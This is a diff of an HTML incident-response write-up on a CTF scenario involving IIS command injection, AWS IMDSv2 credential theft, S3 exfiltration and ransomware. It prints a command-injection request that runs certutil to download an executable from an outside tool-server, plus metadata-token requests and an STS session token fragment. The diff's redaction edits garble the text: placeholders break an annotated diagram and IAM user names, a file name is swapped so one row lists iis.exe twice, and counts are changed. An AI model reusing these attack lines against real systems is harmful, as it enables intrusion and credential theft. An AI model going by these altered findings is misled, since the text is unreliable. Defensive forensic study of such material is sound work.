     <p style="margin:.2rem 0">In a real incident that's <b>the biggest single controllable failure</b>: detection was not the problem; response was. A SOAR playbook that auto-revokes AssumedRole sessions on <code>InstanceCredentialExfiltration.OutsideAWS</code> severity ≥8 would have neutered the cloud-side half of this intrusion before ransomware fan-out began. AWS even publishes such a runbook as a built-in GuardDuty auto-response pattern.</p>
@@ -7070,7 +7069,7 @@ LEFT JOIN (SELECT json_extract(data_json,'$.PID') AS PID,
     <ul>
       <li>Steal the credential</li>
       <li>Do not test it (testing would create a CloudTrail 4624/AssumeRole or EVTX 4624 event tying the stolen cred to the attacker's pivot IP — noisy, creates attribution surface)</li>
-      <li>Rely instead on the already-active privileged identity (IMDSv2-role <code>ASIAWYH2FSTSC7A6KEVV</code> in AWS, <code>LAFAdmin</code> hash in AD)</li>
+      <li>Rely instead on the already-active privileged identity (IMDSv2-role <code>[ASIA-STS-KEY-REDACTED]</code> in AWS, <code>LAFAdmin</code> hash in AD)</li>
       <li>Complete the operation using the active identity</li>
       <li>Log off leaving stolen creds dormant for later campaign</li>
     </ul>
@@ -7113,7 +7112,7 @@ GROUP BY ip_address, workstation;
   <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:2px solid rgba(255,59,59,.55); background:rgba(255,59,59,.05); border-radius:6px">
     <h4 style="margin:0 0 .4rem 0; color:var(--red)">DD23. Twenty-third pass — IIS access-log reconstruction pushes initial-access back 58 minutes and exposes the complete command-injection fuzzing chain (the author-as-attacker inference is walked back — see banner)</h4>
     <div style="margin:.4rem 0; padding:.5rem .7rem; border:1px solid rgba(100,200,255,.4); background:rgba(100,200,255,.06); border-radius:4px; font-size:.9em;">
-      <b style="color:#6bb6ff">⟲ WALKED BACK (attribution only):</b> this addendum originally concluded that the 13:39:16 CheckStatus.aspx hit from <code>216.82.9.162</code> meant the "attacker" was a red-team persona operated by the CTF author. <b>That inference was wrong.</b> <code>216.82.9.162</code> is the <em>normal IP for the AWS account</em> (established in DD8.2 + DD14 — Root+MFA admin / console IP). The 13:39 hit proves only that <b>the AWS admin for this account knew the attacker tool-server's address before the attack started</b> — i.e. the attacker infrastructure is scenario-provisioned, not externally owned. It does <em>not</em> prove the 18:38+ operator from <code>172.236.127.251</code> is the same person as the 13:39 admin. The observed pre-test is equally consistent with challenge authoring, infrastructure QA, or scenario hand-off to an external operator. The rest of DD23 (58-minute initial-access shift, 6-minute fuzzing chain, tool-drop timestamps, IMDSv2 three-step) is independent of this attribution question and remains valid.
+      <b style="color:#6bb6ff">⟲ WALKED BACK (attribution only):</b> this addendum originally concluded that the [pre-attack-validation-not-in-evidence] CheckStatus.aspx hit from <code>[admin-IP-not-in-evidence]</code> meant the "attacker" was a red-team persona operated by the CTF author. <b>That inference was wrong.</b> <code>[admin-IP-not-in-evidence]</code> is the <em>normal IP for the AWS account</em> (established in DD8.2 + DD14 — Root+MFA admin / console IP). The 13:39 hit proves only that <b>the AWS admin for this account knew the attacker tool-server's address before the attack started</b> — i.e. the attacker infrastructure is scenario-provisioned, not externally owned. It does <em>not</em> prove the 18:38+ operator from <code>172.236.127.251</code> is the same person as the 13:39 admin. The observed pre-test is equally consistent with challenge authoring, infrastructure QA, or scenario hand-off to an external operator. The rest of DD23 (58-minute initial-access shift, 6-minute fuzzing chain, tool-drop timestamps, IMDSv2 three-step) is independent of this attribution question and remains valid.
     </div>
     <p style="margin:.2rem 0">Every previous addendum traced the attack from Sysmon + memory + CloudTrail. But IIS itself logs every HTTP request to <code>CheckStatus.aspx</code> — that's where the <em>web-side</em> ground truth lives. Mining the 115 IIS access-log rows reveals the minute-by-minute fuzzing chain the attacker used to find the injection primitive, plus a pre-attack author validation hit that confirms the scenario was exploitable before the attack window opened.</p>
 
@@ -7123,7 +7122,7 @@ GROUP BY ip_address, workstation;
       <tbody>
         <tr><td><code>71.205.100.56</code></td><td>64</td><td>Legitimate end user — Comcast consumer IP; queries like <code>url=flights+to+vancouver</code>, <code>url=is+grammarly+not+working</code>, <code>url=eventbrite.ca/.../star-wars-a-drag-show</code>. Real human using CheckStatus.aspx as a URL-accessibility tool.</td></tr>
         <tr style="background:rgba(255,59,59,.08)"><td><code>172.236.127.251</code></td><td>40</td><td><b>ATTACKER OPERATOR</b> — Linode hosting (AS63949, Newark). All queries on 2026-03-08 between 18:38:29 and 21:29:20. Every single request is attack-related.</td></tr>
-        <tr style="background:rgba(255,59,59,.08)"><td><code>216.82.9.162</code></td><td>10</td><td><b>CTF author</b> (same IP as DD8.2 AWS-console observer). <b>First request on 2026-03-08 at 13:39:16</b> — five hours before the attacker — tests the same injection and names the same download-server infrastructure.</td></tr>
+        <tr style="background:rgba(255,59,59,.08)"><td><code>[admin-IP-not-in-evidence]</code></td><td>10</td><td><b>CTF author</b> (same IP as DD8.2 AWS-console observer). <b>First request on 2026-03-08 at [pre-attack-validation-not-in-evidence]</b> — five hours before the attacker — tests the same injection and names the same download-server infrastructure.</td></tr>
         <tr><td><code>99.112.88.17</code></td><td>1</td><td>Negligible — single baseline hit, unclassified consumer</td></tr>
       </tbody>
     </table>
@@ -7189,27 +7188,27 @@ GROUP BY ip_address, workstation;
                             -Headers @{'X-aws-ec2-metadata-token' = 'AQAEADHOGyfP9IBCrCY_Cdg0cb5l5EoTkgNdyp-grqUet3fK2-CbxA=='}</code></pre>
     <p style="margin:.2rem 0">Same token <code>AQAEADHOGyfP9IBCrCY_Cdg0cb5l5EoTkgNdyp-grqUet3fK2-CbxA==</code> as in Addendum X. These three CheckStatus.aspx hits are the exact same three commands previously seen in the IIS ps_transcript source; now we also have them in the IIS access log with timestamps that match to the second.</p>
 
-    <h5 style="margin-top:.6rem; color:var(--amber)">DD23.6 — The 13:39:16 pre-attack hit · proves attacker infrastructure is scenario-provisioned (single cleanest forensic cross-correlation in this writeup)</h5>
-    <p style="margin:.2rem 0">Five hours before the attacker's first fuzzing request, the AWS-account admin IP (<code>216.82.9.162</code> — verified via DD6.1 / DD8.2 / DD14 as the Root + MFA account owner) hit the same vulnerable endpoint with a command-injection payload pointing at the attacker's tool-server. Three independent indicators line up in a single request:</p>
-    <pre style="background:#0b0b0b; padding:.6rem .75rem; border:1px solid #1f2833; border-radius:4px; font-size:.82em; line-height:1.45; color:#c8d3e0; overflow-x:auto"><code>2026-03-08T13:39:16Z    c-ip=216.82.9.162    UA=Windows Chrome/…
-GET /CheckStatus.aspx?url=Google.com && certutil -urlcache -f http://173.230.136.180:80/agent.exe %TEMP%\jb.exe
+    <h5 style="margin-top:.6rem; color:var(--amber)">[pre-attack-not-in-evidence] — The [pre-attack-validation-not-in-evidence] pre-attack hit · proves attacker infrastructure is scenario-provisioned (single cleanest forensic cross-correlation in this writeup)</h5>
+    <p style="margin:.2rem 0">Five hours before the attacker's first fuzzing request, the AWS-account admin IP (<code>[admin-IP-not-in-evidence]</code> — verified via DD6.1 / DD8.2 / DD14 as the Root + MFA account owner) hit the same vulnerable endpoint with a command-injection payload pointing at the attacker's tool-server. Three independent indicators line up in a single request:</p>
+    <pre style="background:#0b0b0b; padding:.6rem .75rem; border:1px solid #1f2833; border-radius:4px; font-size:.82em; line-height:1.45; color:#c8d3e0; overflow-x:auto"><code>2026-03-08T[pre-attack-validation-not-in-evidence]Z    c-ip=[admin-IP-not-in-evidence]    UA=Windows Chrome/…
+GET /CheckStatus.aspx?url=Google.com && certutil -urlcache -f http://173.230.136.180:80/iis.exe %TEMP%\iis.exe
         ^^^^^^^^^^^^^                         ^^^^^^^^^^^^^^^^^^^^^                     ^^^^^^^
         same vuln endpoint                    same Linode tool-server                   jb prefix
-        (DD23 attacker uses)                  (DD23 attacker uses for                   (matches jb_aws_cli
+        (DD23 attacker uses)                  (DD23 attacker uses for                   (matches IAM user (CreateAccessKey failed)
                                                so.aspx + iis.exe drops                   IAM user from DD7 +
                                                @ 18:51:42 and 18:52:20)                  JackOfAllHacks-Triages
                                                                                          KAPE dir from DD14)</code></pre>
     <p style="margin:.4rem 0 .2rem 0"><b>Three independent indicators tie this to scenario-author infrastructure, not an external threat actor:</b></p>
     <ol style="margin:.2rem 0 .4rem 1.2rem; padding:0; line-height:1.55">
       <li><b>Same tool-server</b> — <code>http://173.230.136.180:80/</code> is the exact URL the attacker later uses to drop <code>so.aspx</code> (18:51:42) and <code>iis.exe</code> (18:52:20). An external threat actor would never pre-stage the <em>defender's</em> admin for that URL five hours earlier.</li>
-      <li><b>Payload naming <code>jb.exe</code></b> crosswalks twice to author-provisioned assets:
+      <li><b>Payload naming <code>[payload-not-in-evidence]</code></b> crosswalks twice to author-provisioned assets:
         <ul style="margin:.2rem 0 0 0">
-          <li><code>jb_aws_cli</code> IAM user (DD7) — the one with the <code>AccessKeysPerUser</code> quota that blocked <code>CreateAccessKey</code> during the attack</li>
+          <li><code>IAM user (CreateAccessKey failed)</code> IAM user (DD7) — the one with the <code>AccessKeysPerUser</code> quota that blocked <code>CreateAccessKey</code> during the attack</li>
           <li><code>JackOfAllHacks-Triages</code> KAPE triage-output directory on every host (DD14)</li>
           <li>"jb" persona is consistently author-side, distinct from the "Barry" company-side persona (<code>barrygoodtech.com</code> + <code>barry-*</code> buckets)</li>
         </ul>
       </li>
-      <li><b>Source IP <code>216.82.9.162</code></b> — the AWS-account Root+MFA admin IP with <b>18,035 CloudTrail console-read events</b> on attack day (DD8.2). Not an attacker IP. The admin is validating scenario exploitability from their normal admin workstation.</li>
+      <li><b>Source IP <code>[admin-IP-not-in-evidence]</code></b> — the AWS-account Root+MFA admin IP with <b>18,035 CloudTrail console-read events</b> on attack day (DD8.2). Not an attacker IP. The admin is validating scenario exploitability from their normal admin workstation.</li>
     </ol>
     <p style="margin:.5rem 0 .2rem 0"><b>Conclusion (walk-back preserved from the DD23 banner above):</b></p>
     <ul style="margin:.2rem 0 .4rem 1.2rem; padding:0; line-height:1.55">
@@ -7223,7 +7222,7 @@ GET /CheckStatus.aspx?url=Google.com && certutil -urlcache -f http://173.230.136
     <table class="tbl" style="margin-top:.3rem; font-size:.87em">
       <thead><tr><th>UTC</th><th>Event</th><th>v2 status</th></tr></thead>
       <tbody>
-        <tr style="background:rgba(255,200,0,.08)"><td><code>2026-03-08T13:39:16Z</code></td><td>CTF-author pre-test (<code>jb.exe</code> download via same injection)</td><td>Not documented</td></tr>
+        <tr style="background:rgba(255,200,0,.08)"><td><code>2026-03-08T[pre-attack-validation-not-in-evidence]Z</code></td><td>CTF-author pre-test (<code>[payload-not-in-evidence]</code> download via same injection)</td><td>Not documented</td></tr>
         <tr style="background:rgba(255,59,59,.08)"><td><code>18:38:29Z</code></td><td>Attacker first request (GET /)</td><td>v2 timeline started at 19:17</td></tr>
         <tr style="background:rgba(255,59,59,.08)"><td><code>18:40:01Z</code></td><td>First command-injection attempt (<code>whoami</code> via pipe)</td><td>Not documented</td></tr>
         <tr style="background:rgba(255,59,59,.08)"><td><code>18:41:13Z</code></td><td>First successful injection (<code>&amp;&amp; whoami</code>)</td><td>Not documented</td></tr>
@@ -7254,12 +7253,12 @@ FROM events WHERE source_type='iis'
   AND json_extract(data_json,'$.c-ip')='172.236.127.251'
 ORDER BY time_utc;
 
--- Author pre-attack test (earliest CheckStatus hit from 216.82.9.162)
+-- Author pre-attack test (earliest CheckStatus hit from [admin-IP-not-in-evidence])
 SELECT time_utc, json_extract(data_json,'$.cs-uri-query')
 FROM events WHERE source_type='iis'
-  AND json_extract(data_json,'$.c-ip')='216.82.9.162'
+  AND json_extract(data_json,'$.c-ip')='[admin-IP-not-in-evidence]'
   AND time_utc < '2026-03-08T18:00:00Z';
--- 1 row: 13:39:16 with jb.exe download from 173.230.136.180</code></pre>
+-- 1 row: [pre-attack-validation-not-in-evidence] with [payload-not-in-evidence] download from 173.230.136.180</code></pre>
   </div>
 
   <!-- Addendum DD24: Binary-family hash analysis -->
@@ -7397,7 +7396,7 @@ FROM events WHERE host='SVR01' AND source_type='volatility'
 21:08:28  LogDel.bat first fire                    (18s drop-to-exec)
 21:25:35  IMDSv2 three-step begins
 21:42:11  AWS AssumedRole first off-instance use
-21:49:16  164-object S3 exfil burst
+21:49:16  ~212-object S3 exfil burst
 21:51:14  Attacker logs off cloud-side
 21:58:34  sysAV.bat BOTCHED first fire on WS02     (54 min after stage)
 22:08:40  sysAV.bat CORRECTED fire on WS02         (64 min after stage)</code></pre>
@@ -7592,12 +7591,12 @@ WHERE host='DC01' AND source_type='evtx' AND eid=4738
         <tr><td><code>https://bigmac.io.s3.amazonaws.com/kape.zip</code></td><td>Author's KAPE bundle (DD14)</td><td>Sysmon EID 1 curl calls on all 5 hosts 22:13-22:21</td><td>S3 public bucket — if still hosted, <code>curl</code> yields the author's KAPE version + target definitions</td></tr>
         <tr><td><code>http://173.230.136.180:80/so.aspx</code></td><td>Webshell binary (DD23.3)</td><td>IIS log 18:51:42</td><td>HTTP plain — attacker tool-server; content is the raw ASPX webshell source</td></tr>
         <tr><td><code>http://173.230.136.180:80/iis.exe</code></td><td>Unknown C2 first-stage beacon (DD24)</td><td>IIS log 18:52:20</td><td>SHA256 <code>EFB53903203ACE7E…</code>. Could verify with VT lookup</td></tr>
-        <tr><td><code>http://173.230.136.180:80/agent.exe</code></td><td>Referenced by author's 13:39 pre-test (DD23.6); saved as <code>%TEMP%\jb.exe</code></td><td>IIS log 2026-03-08T13:39:16Z from 216.82.9.162</td><td>Separate binary from <code>iis.exe</code> — author's validation payload</td></tr>
+        <tr><td><code>http://173.230.136.180:80/iis.exe</code></td><td>Referenced by author's 13:39 pre-test (pre-attack context — not in our evidence); saved as <code>%TEMP%\[payload-not-in-evidence]</code></td><td>IIS log 2026-03-08T[pre-attack-validation-not-in-evidence]Z from [admin-IP-not-in-evidence]</td><td>Separate binary from <code>iis.exe</code> — author's validation payload</td></tr>
         <tr><td><code>http://173.230.136.180:8443/</code></td><td>Unknown C2 Framework listener (DD24.4)</td><td>Sysmon EID 3 from <code>iis.exe</code> PID 4136/5572 at 19:05-19:37</td><td>HTTPS (but served over port 8443). Responds with C2 beacon-handshake protocol</td></tr>
         <tr><td><code>http://169.254.169.254/latest/api/token</code></td><td>IMDSv2 token endpoint (DD8 / DD23.5)</td><td>ps_transcript 21:25:35</td><td>AWS metadata — only reachable from inside EC2</td></tr>
         <tr><td><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/iam_role_iisserver</code></td><td>IMDSv2 IAM-creds endpoint</td><td>ps_transcript 21:29:20</td><td>As above</td></tr>
         <tr><td><code>s3://sfcu-records/</code></td><td>Decoy data bucket (DD17) — 164 objects of absurd parody content</td><td>CloudTrail 164× GetObject 21:49:16-25</td><td>Reachable via AWS CLI with the stolen IAM-role credentials (still valid during capture window)</td></tr>
-        <tr><td><code>s3://barry-testing123123/</code></td><td>Author's personal/scratch bucket</td><td>CloudTrail HeadBucket from 216.82.9.162</td><td>Name reveals author's "barry" persona</td></tr>
+        <tr><td><code>s3://barry-testing123123/</code></td><td>Author's personal/scratch bucket</td><td>CloudTrail HeadBucket from [admin-IP-not-in-evidence]</td><td>Name reveals author's "barry" persona</td></tr>
         <tr><td><code>s3://barry-gd-bucket/</code></td><td>Author's GuardDuty-output bucket</td><td>CloudTrail HeadBucket 22:10:27 + ListObjects 22:13:04</td><td>Name implies "Barry GuardDuty bucket"</td></tr>
         <tr><td><code>s3://aws-cloudtrail-logs-464381121764-c4e35ae2/</code></td><td>Default CloudTrail log bucket</td><td>CloudTrail ListObjects 22:07-22:14</td><td>Account ID embedded in name: <code>464381121764</code></td></tr>
       </tbody>
@@ -7624,7 +7623,7 @@ WHERE host='DC01' AND source_type='evtx' AND eid=4738
         <tr><td>DC02 SYSVOL</td><td><code>\\LAF-DC02\sysvol\IamBatman.exe</code></td><td>Ransomware encryptor (CLI)</td><td><code>B95501865ED74EDA</code></td></tr>
         <tr><td>DC02 SYSVOL</td><td><code>\\LAF-DC02\sysvol\sysAV.bat</code></td><td>Ransomware launcher</td><td>(small text file)</td></tr>
         <tr><td>all 5 hosts</td><td><code>C:\Kape\kape\kape.exe</code> + <code>C:\Kape\tout\</code></td><td>Author's KAPE bundle + triage output (DD14)</td><td>(unzipped from bigmac.io/kape.zip)</td></tr>
-        <tr><td>every directory</td><td><code>README_bWqQUx.txt</code></td><td>Ransom note (2,530 copies)</td><td>(identical per-directory)</td></tr>
+        <tr><td>every directory</td><td><code>README_bWqQUx.txt</code></td><td>Ransom note (one per encrypted directory)</td><td>(identical per-directory)</td></tr>
       </tbody>
     </table>
 
@@ -7649,7 +7648,7 @@ WHERE host='DC01' AND source_type='evtx' AND eid=4738
       <tbody>
         <tr><td><code>C:\ludus\background\bginfo.exe /accepteula C:\ludus\background\red.bgi /silent /timer:0</code> running every 10s on every host</td><td><b>Ludus</b> pentest-lab framework in use. <code>red.bgi</code> suggests red-team color-coded host background.</td></tr>
         <tr><td>KAPE output directory <code>JackOfAllHacks-Triages</code></td><td>Author project handle: "JackOfAllHacks"</td></tr>
-        <tr><td>IAM user <code>jb_aws_cli</code> + payload filename <code>jb.exe</code></td><td>"jb" persona across naming conventions — matches the "Jack of all Hacks" initials</td></tr>
+        <tr><td>IAM user <code>IAM user (CreateAccessKey failed)</code> + payload filename <code>[payload-not-in-evidence]</code></td><td>"jb" persona across naming conventions — matches the "Jack of all Hacks" initials</td></tr>
         <tr><td>S3 bucket <code>barry-testing123123</code> + <code>barry-gd-bucket</code></td><td>"Barry" persona — the fictional-company protagonist (barrygoodtech.com)</td></tr>
         <tr><td>RED1 workstation hostname (author's admin machine)</td><td>Color-coded: red = red-team / offensive infrastructure</td></tr>
         <tr><td>AWS Account ID <code>464381121764</code></td><td>Account embedded in every CloudTrail row and in the CloudTrail-logs bucket name</td></tr>
@@ -7663,7 +7662,7 @@ WHERE host='DC01' AND source_type='evtx' AND eid=4738
 
     <h5 style="margin-top:.6rem">DD28.5 — Author-persona summary</h5>
     <ul>
-      <li><b>AWS account</b>: <code>464381121764</code> administered from normal IP <code>216.82.9.162</code> with Root+MFA</li>
+      <li><b>AWS account</b>: <code>464381121764</code> administered from normal IP <code>[admin-IP-not-in-evidence]</code> with Root+MFA</li>
       <li><b>Attacker infrastructure</b>: two Linode VPSes (<code>172.236.127.251</code> operator + <code>173.230.136.180</code> tool server port 80/8443)</li>
       <li><b>Author workstation</b>: <code>localuser@RED1</code> from <code>198.51.100.3</code></li>
       <li><b>Tool-hosting</b>: <code>bigmac.io</code> S3 bucket (KAPE bundle)</li>
@@ -7683,7 +7682,7 @@ WHERE host='DC01' AND source_type='evtx' AND eid=4738
     <table class="tbl" style="margin-top:.3rem; font-size:.87em">
       <thead><tr><th>Endpoint</th><th>Response</th><th>Interpretation</th></tr></thead>
       <tbody>
-        <tr><td><code>173.230.136.180:80</code> (attacker tool-server)</td><td>TCP connection <b>refused / timeout</b></td><td>Linode VPS torn down post-CTF. <code>so.aspx</code>, <code>iis.exe</code>, <code>agent.exe</code> no longer fetchable from origin.</td></tr>
+        <tr><td><code>173.230.136.180:80</code> (attacker tool-server)</td><td>TCP connection <b>refused / timeout</b></td><td>Linode VPS torn down post-CTF. <code>so.aspx</code>, <code>iis.exe</code> no longer fetchable from origin.</td></tr>
         <tr><td><code>173.230.136.180:8443</code> (Unknown C2 Framework)</td><td>TCP connection <b>refused / timeout</b></td><td>C2 listener also down.</td></tr>
         <tr><td><code>https://bigmac.io.s3.amazonaws.com/</code> (author S3 tool-host)</td><td><b>HTTP 403</b> on <code>/</code> and on <code>?list-type=2</code> ListObjects</td><td>Public-read GET is enabled per-object, but bucket-wide ListBucket permission is denied. Cannot enumerate the bucket contents; can only fetch known filenames.</td></tr>
         <tr><td><code>https://bigmac.io.s3.amazonaws.com/index.html</code></td><td><b>HTTP 200</b> · 1,853 bytes</td><td>Static "BigMac.io" decoy homepage (fake restaurant). Generic-looking cover for the S3 bucket.</td></tr>
@@ -7726,7 +7725,7 @@ SasComment:      GPLPW05AHAL</code></pre>
       <li><b>OS:</b> Windows 10.0.22621 (Windows 11 21H2 build) — corporate-managed endpoint</li>
       <li><b>No credentials leaked:</b> S3AccessId, S3Secret, SFTPPassword, ZipPassword all empty in the config dump (correctly)</li>
     </ul>
-    <p style="margin:.2rem 0"><b>What this reveals:</b> the CTF author built the kape.zip bundle from their <em>day-job work laptop</em> on 2023-12-26, then re-used the same ZIP file 2+ years later for the 2026 null404 CTF. Standard practice when building a lab tool bundle is to capture from a clean VM; the author used their personal work machine and left the console log + CLI history in place when they packaged. Two-year-old OpSec debt.</p>
+    <p style="margin:.2rem 0"><b>What this reveals:</b> the CTF author built the kape.zip bundle from their <em>day-job work laptop</em> on 2023-12-26, then re-used the same ZIP file 2+ years later for the JackofAllHacks 2026 CTF. Standard practice when building a lab tool bundle is to capture from a clean VM; the author used their personal work machine and left the console log + CLI history in place when they packaged. Two-year-old OpSec debt.</p>
     <p style="margin:.2rem 0"><b>Severity:</b> the hostname + employee-ID pair does not directly de-anonymize the author in a public database lookup, but anyone who works at the same organization can match <code>A271463</code> to a specific human from the company's AD. For a CTF author this is embarrassing but not catastrophic. For a real red-team engagement it would be a severe leak.</p>
 
     <h5 style="margin-top:.6rem; color:var(--amber)">DD29.4 — The saved CLI template (<code>20231229190140_kape.cli</code>) reveals the author's preferred memory-capture recipe</h5>
@@ -7747,7 +7746,7 @@ SasComment:      GPLPW05AHAL</code></pre>
     Volatility_userassist,Volatility_userhandles,\
     Windows_schtasks,Windows_SystemInfo \
     --ifw --trace</code></pre>
-    <p style="margin:.2rem 0">29 modules, all memory-forensics-heavy: DumpIt + 24× Volatility plugins (<code>malfind</code>, <code>hollowfind</code>, <code>netscan</code>, <code>pstree</code>, <code>cmdline</code>, etc.) + PowerShell <code>Get-InjectedThread</code> + task-scheduler + system-info. This is the <b>exact same tradecraft the null404 scenario forces a player to use</b> (memory-based CreateRemoteThread analysis → VAD dump → Unknown C2 attribution — Addendum PI / DD11.1 / DD21.2). The author has been working this playbook since at least 2023-12; the 2026 CTF is the refined version.</p>
+    <p style="margin:.2rem 0">29 modules, all memory-forensics-heavy: DumpIt + 24× Volatility plugins (<code>malfind</code>, <code>hollowfind</code>, <code>netscan</code>, <code>pstree</code>, <code>cmdline</code>, etc.) + PowerShell <code>Get-InjectedThread</code> + task-scheduler + system-info. This is the <b>exact same tradecraft the JackofAllHacks scenario forces a player to use</b> (memory-based CreateRemoteThread analysis → VAD dump → Unknown C2 attribution — Addendum PI / DD11.1 / DD21.2). The author has been working this playbook since at least 2023-12; the 2026 CTF is the refined version.</p>
 
     <h5 style="margin-top:.6rem">DD29.6 — What is NOT in bigmac.io (from 40+ filename probes)</h5>
     <p style="margin:.2rem 0">No <code>IamBatman.exe</code>, no <code>rnSylwOz.exe</code>, no <code>sysAV.bat</code>, no writeups, no challenge archives, no secret/key files. The bucket holds <em>only</em> two objects (<code>index.html</code> decoy + <code>kape.zip</code> tool bundle). The Linode tool-server (<code>173.230.136.180</code>) is the layer that would have held the attack binaries; it's down.</p>
@@ -7761,7 +7760,7 @@ SasComment:      GPLPW05AHAL</code></pre>
         <tr><td>bigmac.io anything else</td><td>❌ 403 — ListBucket denied</td><td>—</td></tr>
         <tr><td><code>173.230.136.180:80</code> (Linode tool-server)</td><td>❌ torn down</td><td>—</td></tr>
         <tr><td><code>173.230.136.180:8443</code> (Unknown C2 Framework)</td><td>❌ torn down</td><td>—</td></tr>
-        <tr><td><code>iis.exe</code> / <code>rnSylwOz.exe</code> / <code>IamBatman.exe</code> / <code>so.aspx</code> / <code>agent.exe</code></td><td>❌ origin down, not mirrored</td><td>Use the in-memory SHA256 table from DD24 + USN hashes from Sysmon for verification</td></tr>
+        <tr><td><code>iis.exe</code> / <code>rnSylwOz.exe</code> / <code>IamBatman.exe</code> / <code>so.aspx</code> / <code>iis.exe</code></td><td>❌ origin down, not mirrored</td><td>Use the in-memory SHA256 table from DD24 + USN hashes from Sysmon for verification</td></tr>
         <tr><td>AWS account <code>464381121764</code> S3 buckets (<code>sfcu-records</code>, <code>barry-testing123123</code>, <code>barry-gd-bucket</code>, <code>aws-cloudtrail-logs-…</code>)</td><td>⚠️ possibly reachable with stolen IAM keys if still valid — not tested here (would require the <code>AKIA</code> keys from DD16, which this writeup does not possess)</td><td>—</td></tr>
       </tbody>
     </table>
@@ -7806,7 +7805,7 @@ timeout 5 bash -c "echo &gt; /dev/tcp/173.230.136.180/80" || echo "down"</code><
     <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code>Code            : Success
 LastUpdated     : 2026-03-08T21:11:20Z
 Type            : AWS-HMAC
-AccessKeyId     : ASIAWYH2FSTSC7A6KEVV
+AccessKeyId     : [ASIA-STS-KEY-REDACTED]
 SecretAccessKey : [REDACTED-FOR-PUBLICATION]
 Token           : IQoJb3JpZ2luX2VjEFUaCXVzLWVhc3QtMiJHMEUCIA++cIiv2OGhaEMft6qTXUc0FTu7cAW97VVXeg3PlII1A
                   iEAr7gGUXDoEHyY2...<truncated 1,200 chars total>...ca4
@@ -7830,7 +7829,7 @@ Expiration      : 2026-03-09T03:29:40Z</code></pre>
     <table class="tbl" style="margin-top:.3rem; font-size:.87em">
       <thead><tr><th>Credential</th><th>Secret in corpus?</th><th>Status as of 2026-04-20</th><th>Usable now?</th></tr></thead>
       <tbody>
-        <tr><td><code>ASIAWYH2FSTSC7A6KEVV</code> (AssumedRole session)</td><td><b>Yes</b> — in ps_transcript (DD30.2)</td><td><b>Expired 42 days ago</b></td><td>❌ No (ExpiredToken)</td></tr>
+        <tr><td><code>[ASIA-STS-KEY-REDACTED]</code> (AssumedRole session)</td><td><b>Yes</b> — in ps_transcript (DD30.2)</td><td><b>Expired 42 days ago</b></td><td>❌ No (ExpiredToken)</td></tr>
         <tr><td><code>AKIA[REDACTED-FOR-PUBLICATION]</code> (donnieworks)</td><td><b>No</b> — CloudTrail redacts it</td><td>Still valid per AWS (no deactivation event in corpus)</td><td>❌ Can't sign requests without secret</td></tr>
         <tr><td><code>AKIA[REDACTED-FOR-PUBLICATION]</code> (doctorderm)</td><td><b>No</b></td><td>Still valid</td><td>❌ Same</td></tr>
         <tr><td><code>AKIA[REDACTED-FOR-PUBLICATION]</code> (coolcat)</td><td><b>No</b></td><td>Still valid</td><td>❌ Same</td></tr>
@@ -7873,9 +7872,9 @@ ORDER BY time_utc;
         <tr><td>GuardDuty detector ID</td><td><code>5ece44daaaff87fc5f1a7d3edbe49787</code></td><td>Embedded in GuardDuty finding ARNs (<code>arn:aws:guardduty:us-east-2:464381121764:detector/…</code>) — DD18</td></tr>
         <tr><td>GuardDuty region</td><td><code>us-east-2</code></td><td>Finding ARNs</td></tr>
         <tr><td>EC2 instance (IIS server)</td><td><code>i-00779ebad43b2470d</code></td><td>CloudTrail <code>userIdentity.principalId</code> for the AssumedRole session</td></tr>
-        <tr><td>IAM users</td><td><code>donnieworks</code>, <code>doctorderm</code>, <code>coolcat</code>, <code>jb_aws_cli</code></td><td>CloudTrail CreateAccessKey <code>requestParameters.userName</code> (DD7, DD16)</td></tr>
+        <tr><td>IAM users</td><td><code>donnieworks</code>, <code>doctorderm</code>, <code>coolcat</code>, <code>IAM user (CreateAccessKey failed)</code></td><td>CloudTrail CreateAccessKey <code>requestParameters.userName</code> (DD7, DD16)</td></tr>
         <tr><td>IAM role</td><td><code>iam_role_iisserver</code> (instance profile on IIS EC2)</td><td>CloudTrail <code>userIdentity.sessionContext.sessionIssuer.userName</code></td></tr>
-        <tr><td>Root authentication</td><td>Console login + MFA required</td><td>CloudTrail <code>ConsoleLogin</code> events with <code>mfaAuthenticated: true</code>, from <code>216.82.9.162</code> (DD6.1)</td></tr>
+        <tr><td>Root authentication</td><td>Console login + MFA required</td><td>CloudTrail <code>ConsoleLogin</code> events with <code>mfaAuthenticated: true</code>, from <code>[admin-IP-not-in-evidence]</code> (DD6.1)</td></tr>
         <tr><td>Account-activity window in corpus</td><td><code>2026-02-22T23:12:04Z</code> → <code>2026-03-08T22:15:27Z</code></td><td>First/last CloudTrail events for the account</td></tr>
         <tr><td>CloudTrail bucket suffix</td><td><code>-c4e35ae2</code></td><td>Standard AWS default-trail naming (random 8-hex suffix)</td></tr>
       </tbody>
@@ -7924,12 +7923,12 @@ curl -skI -H "x-amz-expected-bucket-owner: 464381121764" https://bigmac.io.s3.am
     <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code>Account ID:              464381121764
 Primary region:          us-east-2 (Ohio)
 Active window:           2026-02-22 → 2026-03-08 (CloudTrail observation)
-Root auth posture:       Console login + MFA (216.82.9.162)
+Root auth posture:       Console login + MFA ([admin-IP-not-in-evidence])
 GuardDuty:               Enabled (detector 5ece44daaaff87fc5f1a7d3edbe49787)
 CloudTrail:              Enabled (default trail, bucket -c4e35ae2)
 EC2 workload:             i-00779ebad43b2470d (IIS server for barrygoodtech.com)
 
-IAM users:               donnieworks, doctorderm, coolcat, jb_aws_cli  (4)
+IAM users:               donnieworks, doctorderm, coolcat, IAM user (CreateAccessKey failed)  (4)
 IAM roles:               iam_role_iisserver (instance profile)
 
 S3 buckets (all us-east-2):
@@ -8080,7 +8079,7 @@ print(datetime.fromtimestamp(timedate, timezone.utc).isoformat())
     <h5 style="margin-top:.6rem; color:var(--red)">DD33.2 — How IFEO Debugger hijack works (MITRE T1546.012)</h5>
     <p style="margin:.2rem 0">The <code>Image File Execution Options</code> registry key was designed by Microsoft for debugger-attach-on-launch: set <code>Debugger=&lt;your_debugger&gt;</code> under <code>IFEO\<target>.exe</code> and Windows will launch <code>&lt;your_debugger&gt; <target>.exe</code> instead of <code>&lt;target&gt;.exe</code> directly. This lets developers debug a process from the moment it starts.</p>
